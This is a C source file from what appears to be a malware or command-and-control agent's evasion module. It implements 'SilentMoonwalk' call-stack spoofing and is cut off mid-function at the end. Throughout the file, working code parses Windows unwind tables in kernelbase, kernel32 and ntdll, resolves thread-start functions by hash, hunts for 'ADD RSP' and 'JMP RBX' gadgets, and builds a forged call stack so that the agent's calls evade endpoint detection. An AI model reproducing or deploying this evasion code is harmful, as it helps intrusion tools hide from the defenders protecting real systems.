#include "../../../../headers/agent/evasion/StackSpoof/SilentMoonwalk.h"
#include "../../../../headers/agent/evasion/StackSpoof/Functions.h"
#include "../../../../headers/agent/agent.h"
#include "../../../../headers/agent/evasion/PeParsing/evasive.h"
#include "../../../../headers/cstdreplacement/localcstd.h"
#include <intrin.h>
#include <stdio.h>

SPOOFER sConfig;

PVOID SilentMoonwalkMain(PVOID FunctionPointer, PArgs args, PVOID RetAddr) {
    PERF                pRuntimeFunctionTable;
    PERF                rtFunction;
    DWORD               runtimeFunctionTableSize;
    DWORD               rtLastIndex;
    DWORD               rtSaveIndex;
    DWORD               stackSize;
    DWORD               stackOffsetWhereRbpIsPushed;
    DWORD64             rtTargetOffset;
    HMODULE             kernel32Base = agent->apis->hKernel32;
    HMODULE             kernelBase = agent->apis->hKernelBase;
    HMODULE             ntdllBase = agent->apis->hNtdll;
    PUNWIND_INFO        unwindInfo;
    BOOL                status;
    BOOL                checkpoint;
    unsigned long long               addRspGadget;
    DWORD               skip_jmp_gadget = 0;
    DWORD               skip_stack_pivot_gadget = 0;
    DWORD               skip_prolog_frame = 0;
    DWORD               skip_pop_rsp_frame = 0;


    pRuntimeFunctionTable = (PERF)GetExceptionDirectoryAddress(kernelBase, &runtimeFunctionTableSize);
    rtLastIndex = (DWORD)(runtimeFunctionTableSize/12);
    rtSaveIndex = 0;
    stackSize = 0;
    rtTargetOffset = 0;
    status = 0;
    checkpoint = 0;
    addRspGadget = ADD_RSP_0x58;

    MemorySet(&sConfig, 0, sizeof(SPOOFER));

    sConfig.KernelBaseAddress = (PVOID)kernelBase;
    sConfig.KernelBaseAddressEnd = (PVOID)((UINT64)kernelBase + 0x368cc4);

    int_srand(SEED);

    skip_pop_rsp_frame++;

    PVOID pBaseThreadInitThunk = (PVOID)GetSymbolAddress(kernel32Base, agent->apis->BaseThreadInitThunkHash);
    PVOID pRtlUserThreadStart = (PVOID)GetSymbolAddress(ntdllBase, agent->apis->RtlUserThreadStartHash);

    if (pBaseThreadInitThunk == NULL || pRtlUserThreadStart == NULL) {
        return FALSE;
    }

    PRUNTIME_FUNCTION f = NULL;
    PUNWIND_INFO ui = NULL;
    DWORD StackSizeOf = 0;

    f = RTFindFunctionByAddress((UINT64)kernel32Base, (UINT64)pBaseThreadInitThunk - (UINT64)kernel32Base);

    if (f != NULL) {
        ui = (PUNWIND_INFO)((UINT64)kernel32Base + (DWORD) f->UnwindData);
        GetStackFrameSizeIgnoringUwopSetFpreg(kernel32Base, (PVOID)ui, &StackSizeOf);

        sConfig.BaseThreadInitThunkAddress = (PVOID)pBaseThreadInitThunk;
        sConfig.BaseThreadInitThunkFrameSize = (UINT64)StackSizeOf;
    } else {
        return FALSE;
    }

    StackSizeOf = 0;
    f = NULL;
    f = RTFindFunctionByAddress((UINT64)ntdllBase, (UINT64)pRtlUserThreadStart - (UINT64)ntdllBase);

    if(f != NULL) {
        ui = (PUNWIND_INFO)((UINT64)ntdllBase + (DWORD)f->UnwindData);
        GetStackFrameSizeIgnoringUwopSetFpreg(ntdllBase, (PVOID)ui, &StackSizeOf);

        sConfig.RtlUserThreadStartAddress = (PVOID)pRtlUserThreadStart;
        sConfig.RtlUserThreadStartFrameSize = (UINT64)StackSizeOf;
    } else {
        return FALSE;
    }

    if (FunctionPointer == NULL || RetAddr == NULL || args == NULL) {
        return FALSE;
    }

    sConfig.SpoofFunctionPointer = (PVOID)FunctionPointer;
    sConfig.Nargs = args->Nargs;
    sConfig.Arg01 = args->Arg01;
    sConfig.Arg02 = args->Arg02;
    sConfig.Arg03 = args->Arg03;
    sConfig.Arg04 = args->Arg04;
    sConfig.Arg05 = args->Arg05;
    sConfig.Arg06 = args->Arg06;
    sConfig.Arg07 = args->Arg07;
    sConfig.Arg08 = args->Arg08;
    sConfig.Arg09 = args->Arg09;
    sConfig.Arg10 = args->Arg10;

    MemorySet(&addRspGadget, 0, 8);;

    sConfig.ReturnAddress = RetAddr;

    sConfig.FirstFrameRandomOffset = (UINT64)int_rand();
    sConfig.SecondFrameRandomOffset = (UINT64)int_rand();

    FindProlog(kernelBase, pRuntimeFunctionTable, rtLastIndex, &stackSize, &rtSaveIndex, &skip_prolog_frame, &rtTargetOffset);
    stackOffsetWhereRbpIsPushed = FindPushRbp(kernelBase, pRuntimeFunctionTable, rtLastIndex, &stackSize, &rtSaveIndex, &skip_pop_rsp_frame, &rtTargetOffset);


    FindGadget(kernelBase, pRuntimeFunctionTable, rtLastIndex, &stackSize, &rtSaveIndex, &skip_jmp_gadget, 0);
    FindGadget(kernelBase, pRuntimeFunctionTable, rtLastIndex, &stackSize, &rtSaveIndex, &skip_stack_pivot_gadget, 1);

    PVOID ret_value = spoof_call(&sConfig);

    return ret_value;
}

/*
This function identifies the first frame of the call stack we need to perform our spoofing.
Returns a boolean value based on whether the frame was found or not.
Sets the values in the sconfig structure to the frame pointer and stack size needed.
*/
DWORD FindProlog(_In_ HMODULE moduleBase, _In_ PERF pRuntimeFunctionTable, _In_ DWORD rtLastIndex, _Out_ PDWORD stackSize, _Out_ PDWORD prtSaveIndex, _Out_  PDWORD skip, _Out_ PDWORD64 rtTargetOffset) {
    PUNWIND_INFO unwindInfo;
    DWORD        status = 0;
    DWORD        suitableFrames = 0;
    *stackSize = 0;

    for (DWORD i = 0; i < rtLastIndex; i++)
    {

        unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunctionTable[i].UnwindData);
        status = GetStackFrameSize(moduleBase, (PVOID)unwindInfo, stackSize);

        if (status != 0) {
            suitableFrames++;
            if (*skip >= suitableFrames) {
                // Let's try another frame
                continue;
            }
            *skip = suitableFrames;


            *prtSaveIndex = i;
            break;

        }
    }

    *rtTargetOffset = (DWORD64)((UINT64)moduleBase + (UINT64)pRuntimeFunctionTable[*prtSaveIndex].BeginAddress);
    sConfig.FirstFrameFunctionPointer = (PVOID)*rtTargetOffset;
    sConfig.FirstFrameSize = *stackSize;

    return status;
}

/*
Similar to FindProlog, this function identifies the second frame of the call stack we need to perform our spoofing.
Returns a boolean value based on whether the frame was found or not.
Sets the values in the sconfig structure to the frame pointer and stack size needed.

*/
DWORD FindPushRbp(HMODULE moduleBase, PERF pRuntimeFunctionTable, DWORD rtLastIndex, PDWORD stackSize, PDWORD prtSaveIndex, PDWORD skip, PDWORD64 rtTargetOffset) {
    PUNWIND_INFO unwindInfo;
    DWORD        status = 0;
    DWORD        suitableFrames = 0;
    *stackSize = 0;

    for (DWORD i = 0; i < rtLastIndex; i++)
    {

        unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunctionTable[i].UnwindData);
        status = GetStackFrameSizeWhereRbpIsPushedOnStack(moduleBase, (PVOID)unwindInfo, stackSize);

        if (0 != status) {

            suitableFrames++;
            if (*skip >= suitableFrames) {
                // Let's try another frame
                continue;
            }
            *skip = suitableFrames;
            *prtSaveIndex = i;

            break;
        }
    }

    *rtTargetOffset = (DWORD64)((UINT64)moduleBase + (UINT64)pRuntimeFunctionTable[*prtSaveIndex].BeginAddress);
    sConfig.SecondFrameFunctionPointer = (PVOID)*rtTargetOffset;
    sConfig.SecondFrameSize = *stackSize;
    sConfig.StackOffsetWhereRbpIsPushed = status;

    return status;
}

/*
Pretty Self explanitory function. Finds a gadget, either ADD RSP, X or JMP [RBX]
Using the GetStackFrameSizeInfornigUwopSetFpreg function, we can calculate the stack size of the frame for each gadget function.
*/

VOID FindGadget(HMODULE moduleBase, PERF pRuntimeFunctionTable, DWORD rtLastIndex, PDWORD stackSize, PDWORD prtSaveIndex, PDWORD skip, DWORD gadgetType) {
    DWORD           gadgets = 0;
    DWORD           status;
    PUNWIND_INFO    unwindInfo;
    DWORD           addRspGadget = ADD_RSP_0x58;


    for (DWORD i = 0; i < rtLastIndex; i++)
    {
        BOOL gadgetFound = FALSE;
        for (UINT64 j = (UINT64)moduleBase + pRuntimeFunctionTable[i].BeginAddress; j < (UINT64)moduleBase + pRuntimeFunctionTable[i].EndAddress; j++) {

            if ((*(DWORD*)j == addRspGadget && *(BYTE*)(j + 4) == RET && gadgetType == 1) || (*(WORD*)j == JMP_RBX && gadgetType == 0)) {

                *stackSize = 0;
                unwindInfo = (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pRuntimeFunctionTable[i].UnwindData);
                status = GetStackFrameSizeIgnoringUwopSetFpreg(moduleBase, (PVOID)unwindInfo, stackSize);

                if (status != 0) {
                    gadgets++;
                    if (*skip >= gadgets) {
                        // Let's try another gadget
                        continue;
                    }
                    *skip = gadgets;

                    if (gadgetType == 1){
                        sConfig.AddRspXGadget = (PVOID)j;
                        sConfig.AddRspXGadgetFrameSize = *stackSize;
                        gadgetFound = TRUE;
                        *prtSaveIndex = i;
                    }
                    else {
                        sConfig.JmpRbxGadget = (PVOID)j;
                        sConfig.JmpRbxGadgetFrameSize = *stackSize;
                        gadgetFound = TRUE;
                        *prtSaveIndex = i;

                    }
                    break;
                }
            }
        }
        if (gadgetFound) {
            break;
        }
    }


}


/*
* Similar to GetStackFrameSize, this function identifies the stack size of a frame that is identified with the PUSH RBP operation.
* Will return the stack frame size once UWOP_PUSH_NONVOL (RBP) is found.
*/
DWORD GetStackFrameSizeWhereRbpIsPushedOnStack(HMODULE moduleBase, PVOID unwindInfoAddress, DWORD* targetStackOffset) {

    DWORD               saveStackOffset;
    DWORD               backupStackOffset;
    DWORD               frameOffsets[MAX_FRAMES];
    PRUNTIME_FUNCTION   pChainedFunction;

    BOOL                RBP_PUSHED          = FALSE;
    PUNWIND_INFO        unwindInfo          = (PUNWIND_INFO)unwindInfoAddress;
    PUNWIND_CODE        unwindCode          = (PUNWIND_CODE)unwindInfo->UnwindCode;
    MIN_CTX             ctx                 = {0};
    DWORD               frameSize           = 0;
    DWORD               nodeIndex           = 0;
    DWORD               countOfCodes        = unwindInfo->CountOfCodes;

    saveStackOffset                         = 0;
    *targetStackOffset                      = 0;
    backupStackOffset                       = *targetStackOffset;

    // Initialise context
    MemorySet(&ctx, 0, sizeof(MIN_CTX));
    // printf("The stack is now 0x%I64X\n", *targetOffset);

    while (nodeIndex < countOfCodes) {
        // Ensure frameSize is reset
        frameSize = 0;

        switch (unwindCode->UnwindOp) {

        case UWOP_PUSH_NONVOL: // 0

            if (unwindCode->OpInfo == RSP) {
                // We break here
                return 0;
            }
            if (unwindCode->OpInfo == RBP && RBP_PUSHED) {
                return 0;
            }
            else if (unwindCode->OpInfo == RBP) {
                saveStackOffset = *targetStackOffset;
                RBP_PUSHED = 1;
            }

            *targetStackOffset += 8;
            break;

        case UWOP_ALLOC_LARGE: // 1
            // If the operation info equals 0 -> allocation size / 8 in next slot
            // If the operation info equals 1 -> unscaled allocation size in next 2 slots
            // In any case, we need to advance 1 slot and record the size

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);

            // Keep track of current node
            nodeIndex++;
            // Register size in next slot
            frameSize = unwindCode->FrameOffset;

            if (unwindCode->OpInfo == 0) {
                // If the operation info equals 0, then the size of the allocation divided by 8
                // is recorded in the next slot, allowing an allocation up to 512K - 8.
                // We already advanced of 1 slot, and recorded the allocation size
                // We just need to multiply it for 8 to get the unscaled allocation size
                frameSize *= 8;
            }
            else
            {
                // If the operation info equals 1, then the unscaled size of the allocation is
                // recorded in the next two slots in little-endian format, allowing allocations
                // up to 4GB - 8.
                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                // Keep track of current node
                nodeIndex++;
                // Unmask the rest of the allocation size
                frameSize += unwindCode->FrameOffset << 16;

            }
            *targetStackOffset += frameSize;
            break;

        case UWOP_ALLOC_SMALL: // 2

            // Allocate a small-sized area on the stack. The size of the allocation is the operation
            // info field * 8 + 8, allowing allocations from 8 to 128 bytes.
            *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
            break;


        case UWOP_SET_FPREG: // 3
            return 0;
            break; // EARLY RET

        case UWOP_SAVE_NONVOL: // 4
            // Save a nonvolatile integer register on the stack using a MOV instead of a PUSH. This code is
            // primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack in a position
            // that was previously allocated. The operation info is the number of the register. The scaled-by-8
            // stack offset is recorded in the next unwind operation code slot, as described in the note above.
            if (unwindCode->OpInfo == RSP) {
                // This time, we return only if RSP was saved
                return 0;
            }
            else
            {
                // For future use: save the scaled by 8 stack offset
                *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset * 8;

                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                nodeIndex++;

                if (unwindCode->OpInfo != RBP) {
                    // Restore original stack size (!?)
                    *targetStackOffset = backupStackOffset;
                    break;
                }
                if (RBP_PUSHED) {
                    return 0;
                }

                RBP_PUSHED = TRUE;
                // We save the stack offset where MOV [RSP], RBP happened
                // During unwinding, this address will be popped back in RBP
                saveStackOffset = *((ULONG*)&ctx + unwindCode->OpInfo);

                // Restore original stack size (!?)
                *targetStackOffset = backupStackOffset;
            }

            break;
        case UWOP_SAVE_NONVOL_BIG: // 5
            // Save a nonvolatile integer register on the stack with a long offset, using a MOV instead of a PUSH.
            // This code is primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack
            // in a position that was previously allocated. The operation info is the number of the register.
            // The unscaled stack offset is recorded in the next two unwind operation code slots, as described
            // in the note above.
            if (unwindCode->OpInfo == RSP) {
                return 0;
            }

            // For future use
            *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset;
            *((ULONG*)&ctx + unwindCode->OpInfo) += (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 2))->FrameOffset << 16;

            if (unwindCode->OpInfo != RBP) {
                // Restore original stack size (!?)
                *targetStackOffset = backupStackOffset;
                break;
            }
            if (RBP_PUSHED) {
                return 0;
            }
            // We save the stack offset where MOV [RSP], RBP happened
            // During unwinding, this address will be popped back in RBP
            saveStackOffset = *((ULONG*)&ctx + unwindCode->OpInfo);
            // Restore Stack Size
            *targetStackOffset = backupStackOffset;

            // Skip the other two nodes used for this unwind operation
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;

            break;

        case UWOP_EPILOG:            // 6
        case UWOP_SAVE_XMM128:       // 8
            // Save all 128 bits of a nonvolatile XMM register on the stack. The operation info is the number of
            // the register. The scaled-by-16 stack offset is recorded in the next slot.

            // TODO: Handle this

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            nodeIndex++;
            break;
        case UWOP_SPARE_CODE:        // 7
        case UWOP_SAVE_XMM128BIG:    // 9
            // Save all 128 bits of a nonvolatile XMM register on the stack with a long offset. The operation info
            // is the number of the register. The unscaled stack offset is recorded in the next two slots.

            // TODO: Handle this

            // Advancing next 2 nodes
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;
            break;
        case UWOP_PUSH_MACH_FRAME:    // 10
            // Push a machine frame. This unwind code is used to record the effect of a hardware interrupt or exception.
            // There are two forms.

            // NOTE: UNTESTED
            // TODO: Test this
            if (unwindCode->OpInfo == 0) {
                *targetStackOffset += 0x40;
            }
            else {
                *targetStackOffset += 0x48;
            }
            break;
        }

        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (BitChainInfo(unwindInfo->Flags))
    {
        nodeIndex = unwindInfo->CountOfCodes;
        if (0 != (nodeIndex & 1))
        {
            nodeIndex += 1;
        }
        pChainedFunction = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);
        return GetStackFrameSize(moduleBase, (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pChainedFunction->UnwindData), targetStackOffset);
    }

    return saveStackOffset;


}

DWORD GetStackFrameSizeIgnoringUwopSetFpreg(HMODULE moduleBase, PVOID unwindInfoAddress, DWORD* targetStackOffset) {

    DWORD               saveStackOffset;
    DWORD               backupStackOffset;
    DWORD               frameOffsets[MAX_FRAMES];
    PRUNTIME_FUNCTION   pChainedFunction;

    PUNWIND_INFO        unwindInfo          = (PUNWIND_INFO)unwindInfoAddress;
    PUNWIND_CODE        unwindCode          = (PUNWIND_CODE)unwindInfo->UnwindCode;
    MIN_CTX             ctx                 = {0};
    DWORD               frameSize           = 0;
    DWORD               nodeIndex           = 0;
    DWORD               countOfCodes        = unwindInfo->CountOfCodes;

    saveStackOffset                         = 0;
    *targetStackOffset                      = 0;
    backupStackOffset                       = *targetStackOffset;

    // Initialise context
    MemorySet(&ctx, 0, sizeof(MIN_CTX));
    // printf("The stack is now 0x%I64X\n", *targetOffset);

    while (nodeIndex < countOfCodes) {
        // Ensure frameSize is reset
        frameSize = 0;

        switch (unwindCode->UnwindOp) {

        case UWOP_PUSH_NONVOL: // 0

            if (unwindCode->OpInfo == RSP) {
                // We break here
                return 0;
            }
            *targetStackOffset += 8;
            break;

        case UWOP_ALLOC_LARGE: // 1
            // If the operation info equals 0 -> allocation size / 8 in next slot
            // If the operation info equals 1 -> unscaled allocation size in next 2 slots
            // In any case, we need to advance 1 slot and record the size

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);

            // Keep track of current node
            nodeIndex++;
            // Register size in next slot
            frameSize = unwindCode->FrameOffset;

            if (unwindCode->OpInfo == 0) {
                // If the operation info equals 0, then the size of the allocation divided by 8
                // is recorded in the next slot, allowing an allocation up to 512K - 8.
                // We already advanced of 1 slot, and recorded the allocation size
                // We just need to multiply it for 8 to get the unscaled allocation size
                frameSize *= 8;
            }
            else
            {
                // If the operation info equals 1, then the unscaled size of the allocation is
                // recorded in the next two slots in little-endian format, allowing allocations
                // up to 4GB - 8.
                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                // Keep track of current node
                nodeIndex++;
                // Unmask the rest of the allocation size
                frameSize += unwindCode->FrameOffset << 16;

            }
            *targetStackOffset += frameSize;
            break;

        case UWOP_ALLOC_SMALL: // 2

            // Allocate a small-sized area on the stack. The size of the allocation is the operation
            // info field * 8 + 8, allowing allocations from 8 to 128 bytes.
            *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
            break;


        case UWOP_SET_FPREG: // 3
            // IGNORED
            break;

        case UWOP_SAVE_NONVOL: // 4
            // Save a nonvolatile integer register on the stack using a MOV instead of a PUSH. This code is
            // primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack in a position
            // that was previously allocated. The operation info is the number of the register. The scaled-by-8
            // stack offset is recorded in the next unwind operation code slot, as described in the note above.
            if (unwindCode->OpInfo == RSP) {
                // This time, we return only if RSP was saved
                return 0;
            }
            else
            {
                // For future use: save the scaled by 8 stack offset
                *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset * 8;

                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                nodeIndex++;

                // We save the stack offset where MOV [RSP], RBP happened
                // During unwinding, this address will be popped back in RBP
                saveStackOffset = *((ULONG*)&ctx + unwindCode->OpInfo);

                // Restore original stack size (!?)
                *targetStackOffset = backupStackOffset;
            }

            break;
        case UWOP_SAVE_NONVOL_BIG: // 5
            // Save a nonvolatile integer register on the stack with a long offset, using a MOV instead of a PUSH.
            // This code is primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack
            // in a position that was previously allocated. The operation info is the number of the register.
            // The unscaled stack offset is recorded in the next two unwind operation code slots, as described
            // in the note above.
            if (unwindCode->OpInfo == RSP) {
                return 0;
            }

            // For future use
            *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset;
            *((ULONG*)&ctx + unwindCode->OpInfo) += (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 2))->FrameOffset << 16;

            // We save the stack offset where MOV [RSP], RBP happened
            // During unwinding, this address will be popped back in RBP
            saveStackOffset = *((ULONG*)&ctx + unwindCode->OpInfo);
            // Restore Stack Size
            *targetStackOffset = backupStackOffset;

            // Skip the other two nodes used for this unwind operation
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;

            break;

        case UWOP_EPILOG:            // 6
        case UWOP_SAVE_XMM128:       // 8
            // Save all 128 bits of a nonvolatile XMM register on the stack. The operation info is the number of
            // the register. The scaled-by-16 stack offset is recorded in the next slot.

            // TODO: Handle this

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            nodeIndex++;
            break;
        case UWOP_SPARE_CODE:        // 7
        case UWOP_SAVE_XMM128BIG:    // 9
            // Save all 128 bits of a nonvolatile XMM register on the stack with a long offset. The operation info
            // is the number of the register. The unscaled stack offset is recorded in the next two slots.

            // TODO: Handle this

            // Advancing next 2 nodes
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;
            break;
        case UWOP_PUSH_MACH_FRAME:    // 10
            // Push a machine frame. This unwind code is used to record the effect of a hardware interrupt or exception.
            // There are two forms.

            // NOTE: UNTESTED
            // TODO: Test this
            if (unwindCode->OpInfo == 0) {
                *targetStackOffset += 0x40;
            }
            else {
                *targetStackOffset += 0x48;
            }
            break;
        }

        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (BitChainInfo(unwindInfo->Flags))
    {
        nodeIndex = unwindInfo->CountOfCodes;
        if (0 != (nodeIndex & 1))
        {
            nodeIndex += 1;
        }
        pChainedFunction = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);
        return GetStackFrameSizeIgnoringUwopSetFpreg(moduleBase, (PUNWIND_INFO)((UINT64)moduleBase + (DWORD)pChainedFunction->UnwindData), targetStackOffset);
    }

    return *targetStackOffset;


}

/*
Calculates the total stack size for a given frame in the unwind table..
The return value will be a boolean based on whether or not we've found a function that is suitable for us to spoof.
Once a frame is found that has the first frame action we're looking for "UWOP_SET_FPREG" , we return the stack size of that frame.
*/
DWORD GetStackFrameSize(_In_ HMODULE hModule, _In_ PVOID unwindInfoAddress, _Out_ DWORD* targetStackOffset) {

    UINT64              saveID;
    DWORD               frameOffsets[MAX_FRAMES];
    PRUNTIME_FUNCTION   pChainedFunction;
    USHORT              _fo;

    DWORD               frameSize           = 0;
    DWORD               nodeIndex           = 0;
    BOOL                UWOP_SET_FPREG_HIT  = FALSE;
    PUNWIND_INFO        unwindInfo          = (PUNWIND_INFO)unwindInfoAddress;
    PUNWIND_CODE        unwindCode          = (PUNWIND_CODE)unwindInfo->UnwindCode;
    MIN_CTX             ctx                 = {0};

    // Restore Stack Size
    *targetStackOffset                      = 0;

    // Initialise context
    MemorySet(&ctx, 0, sizeof(MIN_CTX));
    // printf("The stack is now 0x%I64X\n", *targetOffset);

    while(nodeIndex < unwindInfo->CountOfCodes){
        // Ensure frameSize is reset
        frameSize = 0;

        switch (unwindCode->UnwindOp) {

        case UWOP_PUSH_NONVOL: // 0

            if (unwindCode->OpInfo == RSP && !UWOP_SET_FPREG_HIT) {
                // We break here
                return 0;
            }
            *targetStackOffset += 8;
            break;

        case UWOP_ALLOC_LARGE: // 1
            // If the operation info equals 0 -> allocation size / 8 in next slot
            // If the operation info equals 1 -> unscaled allocation size in next 2 slots
            // In any case, we need to advance 1 slot and record the size

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);

            // Keep track of current node
            nodeIndex++;
            // Register size in next slot
            frameSize = unwindCode->FrameOffset;

            if (unwindCode->OpInfo == 0) {
                // If the operation info equals 0, then the size of the allocation divided by 8
                // is recorded in the next slot, allowing an allocation up to 512K - 8.
                // We already advanced of 1 slot, and recorded the allocation size
                // We just need to multiply it for 8 to get the unscaled allocation size
                frameSize *= 8;
            }
            else
            {
                // If the operation info equals 1, then the unscaled size of the allocation is
                // recorded in the next two slots in little-endian format, allowing allocations
                // up to 4GB - 8.
                // Skip to next Unwind Code
                unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
                // Keep track of current node
                nodeIndex++;
                // Unmask the rest of the allocation size
                frameSize += unwindCode->FrameOffset << 16;

            }
            *targetStackOffset += frameSize;
            break;

        case UWOP_ALLOC_SMALL: // 2

            // Allocate a small-sized area on the stack. The size of the allocation is the operation
            // info field * 8 + 8, allowing allocations from 8 to 128 bytes.
            *targetStackOffset += 8 * (unwindCode->OpInfo + 1);
            break;


        case UWOP_SET_FPREG: // 3
            // Establish the frame pointer register by setting the register to some offset of the current RSP.
            // The offset is equal to the Frame Register offset (scaled) field in the UNWIND_INFO * 16, allowing
            // offsets from 0 to 240. The use of an offset permits establishing a frame pointer that points to the
            // middle of the fixed stack allocation, helping code density by allowing more accesses to use short
            // instruction forms. The operation info field is reserved and shouldn't be used.

            if (BitEHandler(unwindInfo->Flags) && BitChainInfo(unwindInfo->Flags)) {
                return 0;
            }

            UWOP_SET_FPREG_HIT  = TRUE;

            frameSize           = -0x10 * (unwindInfo->FrameOffset);
            *targetStackOffset += frameSize;
            break;


        case UWOP_SAVE_NONVOL: // 4
            // Save a nonvolatile integer register on the stack using a MOV instead of a PUSH. This code is
            // primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack in a position
            // that was previously allocated. The operation info is the number of the register. The scaled-by-8
            // stack offset is recorded in the next unwind operation code slot, as described in the note above.
            if (unwindCode->OpInfo == RBP || unwindCode->OpInfo == RSP) {
                return 0;
            }
            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            nodeIndex++;

            // For future use
            *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset * 8;

            break;
        case UWOP_SAVE_NONVOL_BIG: // 5
            // Save a nonvolatile integer register on the stack with a long offset, using a MOV instead of a PUSH.
            // This code is primarily used for shrink-wrapping, where a nonvolatile register is saved to the stack
            // in a position that was previously allocated. The operation info is the number of the register.
            // The unscaled stack offset is recorded in the next two unwind operation code slots, as described
            // in the note above.
            if (unwindCode->OpInfo == RBP || unwindCode->OpInfo == RSP) {
                return 0;
            }

            // For future use
            *((ULONG*)&ctx + unwindCode->OpInfo) = *targetStackOffset + (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 1))->FrameOffset;
            *((ULONG*)&ctx + unwindCode->OpInfo) += (DWORD)((PUNWIND_CODE)((PWORD)unwindCode + 2))->FrameOffset << 16;

            // Skip the other two nodes used for this unwind operation
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;

            break;

        case UWOP_EPILOG:            // 6
        case UWOP_SAVE_XMM128:       // 8
            // Save all 128 bits of a nonvolatile XMM register on the stack. The operation info is the number of
            // the register. The scaled-by-16 stack offset is recorded in the next slot.

            // TODO: Handle this

            // Skip to next Unwind Code
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
            nodeIndex++;
            break;
        case UWOP_SPARE_CODE:        // 7
        case UWOP_SAVE_XMM128BIG:    // 9
            // Save all 128 bits of a nonvolatile XMM register on the stack with a long offset. The operation info
            // is the number of the register. The unscaled stack offset is recorded in the next two slots.

            // TODO: Handle this

            // Advancing next 2 nodes
            unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 2);
            nodeIndex += 2;
            break;
        case UWOP_PUSH_MACH_FRAME:    // 10
            // Push a machine frame. This unwind code is used to record the effect of a hardware interrupt or exception.
            // There are two forms.

            // NOTE: UNTESTED
            // TODO: Test this
            if (unwindCode->OpInfo == 0) {
                *targetStackOffset += 0x40;
            }
            else {
                *targetStackOffset += 0x48;
            }
            break;
        }

        unwindCode = (PUNWIND_CODE)((PWORD)unwindCode + 1);
        nodeIndex++;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (BitChainInfo(unwindInfo->Flags))
    {
        nodeIndex = unwindInfo->CountOfCodes;
        if (0 != (nodeIndex & 1))
        {
            nodeIndex += 1;
        }
        pChainedFunction = (PRUNTIME_FUNCTION)(&unwindInfo->UnwindCode[nodeIndex]);
        return GetStackFrameSize(hModule, (PUNWIND_INFO)((UINT64)hModule + (DWORD)pChainedFunction->UnwindData), targetStackOffset);
    }

    return UWOP_SET_FPREG_HIT;


}

PIMAGE_RUNTIME_FUNCTION_ENTRY RTFindFunctionByAddress(UINT64 modulelBase, DWORD64 functionOffset) {

    DWORD                   tSize;
    PRUNTIME_FUNCTION       pRuntimeFunctionTable;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;

    pRuntimeFunctionTable = (PRUNTIME_FUNCTION)(GetExceptionDirectoryAddress((HMODULE)modulelBase, &tSize));
    pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(GetExportDirectoryAddress((HMODULE)modulelBase));

    for (DWORD i = 0; i < pImageExportDirectory->NumberOfFunctions; i++)
    {
        if (pRuntimeFunctionTable[i].BeginAddress == functionOffset) {

            return pRuntimeFunctionTable + i;
        }
    }
    return NULL;
}


BYTE ExtractOpInfo(BYTE OpIC) {
    return OpIC >> 4;
}

BYTE ExtractOpCode(BYTE OpIC) {
    return OpIC & 0x0F;
}

char* GetOpInfo(int op) {
    char* reg = (char*)agent->apis->pLocalAlloc(LPTR, 4);
    if (reg == NULL) {
        return NULL;
    }

